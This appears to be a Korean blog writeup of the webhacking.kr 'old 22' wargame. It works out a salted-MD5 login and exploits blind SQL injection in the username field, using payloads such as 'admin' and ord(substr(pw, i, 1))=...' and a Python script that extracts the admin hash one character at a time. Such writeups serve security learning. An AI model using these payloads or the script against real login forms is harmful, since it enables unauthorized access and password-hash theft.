---
title: "webhacking.kr old 22 문제 풀이"
date: 2025-04-09 00:00:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, blind sql injection] 
description: webhacking.kr old 22 문제 풀이
---

[https://webhacking.kr/challenge/bonus-2/index.php](https://webhacking.kr/challenge/bonus-2/index.php)
# 문제 풀이
1. guest guest 입력 시 로그인 성공 후 password hash 값 출력
2. md5 인코딩으로 추정됨
	- 확인해보니 "password" + apple 인코딩 값
3. pw에는 인젝션 불가능, id에 가능
4.  `guest' and pw='guest' -- ` 입력 시에 로그인 실패
5. `guest' and pw='8c3a432045300fddc9050bb678749eb9' -- `를 하면 wrong password 출력
	- password input에 값을 넣지 않아서 그런 듯 함

6. `guest' and length(pw)=32 -- `, 모든 비번은 아마 md5 32자리로 저장되는 듯 함.
	- 그래서 해당 쿼리에 wrong password가 출력
7. admin' and ord(substr(pw, 1, 1))<97 -- 
8. 파이썬 자동화 코드 작성
9. md5 값 얻어 복호화
10. 비밀번호 알아내기
11. 제출
## 분석
웹페이지에 접속하면 username, password 값을 입력받는 인풋 박스들이 있고 제출을 의미하는 login 버튼과 회원가입을 위한 join 버튼이 있다.<br />

그리고 admin으로 로그인하는 것이 우리의 목표라고 한다.<br /> 그 아래에는 컬럼 이름이 각각 id, pw라고 친절하게 알려주는 것을 보니 SQLI 문제인듯 하다.
### guest 테스트
테스트로 아이디, 비밀번호 모두 "guest"로 입력하여 유저 하나를 회원가입시키고 로그인을 해보니 guest를 반겨줌과 동시에 비밀번호가 hash된 값도 보여준다.<br />
비밀번호 "guest"가 hash된 값은 "8c3a432045300fddc9050bb678749eb9"이라고 한다. 이를 보면 MD5로 인코딩된 것 처럼 보인다.<br />

이게 어떤 값으로 들어가는지 궁금해져서 md5 디코더 사이트를 이용해보니 복호화가 불가능하다고 한다.<br />
그 다음으로는 [CrackStation](https://crackstation.net/)이라는 사이트를 이용하여 레인보우 테이블을 이용한 복호화를 해보니 아래의 결과가 나온다.<br />

| Hash                             | Type | Result     |
| -------------------------------- | ---- | ---------- |
| 8c3a432045300fddc9050bb678749eb9 | md5  | guestapple |
역시 예상대로 md5 형식이 맞았고 내가 설정한 비밀번호 외로 뒤에 "apple"이라는 문자열이 붙어있는 것이 확인된다.<br />
### 서버 작동 예상
지금까지 얻은 정보들로 보았을 때 우리가 로그인 시 username과 password를 입력하고 제출하면 서버에서 값들을 받아오고 비밀번호에 "apple" 접미사를 붙여 md5 암호화를 한다.<br />
그 이후 유저로부터 받은 값들을 쿼리에 넣어주어 해당 쿼리가 올바른 값을 반환하면 login 성공, 그렇지 않다면 fail이라 판단하는 것이다.<br />

```sql
select * from users where id="user_input_id" and pw="user_input_pw"
```
서버에서 사용하는 것으로 예상되는 쿼리는 위와 같다.<br />
## 최종 풀이
해당 문제가 가진 취약점은 Blind SQLI이다.<br />
### 쿼리 작동 여부 테스트
우리가 얻어내야 하는 것은 admin이라는 id를 가진 유저의 pw 값을 얻어내는 것이다.<br />
우선 pw의 길이부터 알아내는 쿼리가 필요하다.<br />

id로는 "admin"을 입력하고 pw로는 "123' or length(pw)=32 -- "를 입력한다.<br />
비밀번호가 32인 이유는 MD5로 변환된 비밀번호가 보통 DB에 들어가기 때문에 32자리인 것을 미리 알 수 있기 때문이다.<br />

그런데 이렇게 작성하여도 "Login Fail!"이라는 문구만 나올 뿐이다.<br />

분명 쿼리에는 문제가 없어보이는데 작동하지 않아 비슷한 방식을 id에 넣어보기로 하였다.<br />
"admin' and length(pw)=32 -- "를 id로 입력하고 pw는 비운 상태로 제출을 하니 이번에는 로그인 실패 문구가 아니라 "Wrong password!"가 나온다.<br />

아마 쿼리에서는 값이 성공적으로 반환됐지만 password 인풋 박스에 들어온 값과 진짜 비밀번호를 비교하는 서버의 또 다른 validation 프로세스가 있는 것 같다.<br />

이로써 우리는 username 인풋 박스에서 SQL Injection이 발생하는 것을 알 수 있다.<br />
### 익스플로잇
```python
import requests
from itertools import chain

url = "https://webhacking.kr/challenge/bonus-2/"
password = ""

for i in range(1, 33):
    for ascii in chain(range(48, 57 + 1), range(97, 122 + 1)):
        data = {
            "uuid": f"admin' and ord(substr(pw, {i}, 1))={ascii} -- ",
            "pw": "",
        }
        resp = requests.post(url, data=data)
        if "Wrong password!" in resp.text:
            print("Found", ascii)
            password += chr(ascii)
            break
    
print(password)
```
이제 파이썬으로 자동화 코드를 작성하여 실행만 해주면 비밀번호를 얻어낼 수 있다.<br />

해당 코드는 SQL의 substr() 함수를 이용하여 비밀번호의 각 자리가 ascii 코드로 문자 '0' ~ '9'와 'a' ~ 'z' 중 무엇인지 알아내는 코드이다.<br />
다시 언급하지만 비밀번호는 md5로 변환된 값이 들어있기 때문에 숫자 아니면 알파벳 소문자로 이루어져 있어서 그 사이에 있는 값으로만 체크하고 있다.<br />

`6c9ca386a903921d7fa230ffa0ffc153` 결과로 이러한 문자열이 나오고 또 다시 [CrackStation](https://crackstation.net/) 사이트를 통해서 복호화를 해보면 "somethingapple"이라는 값이 나온다.<br />

이때 뒤의 apple을 제외한 앞의 문자열을 비밀번호로 입력하고 username으로는 "admin"을 입력하면 문제가 해결된다.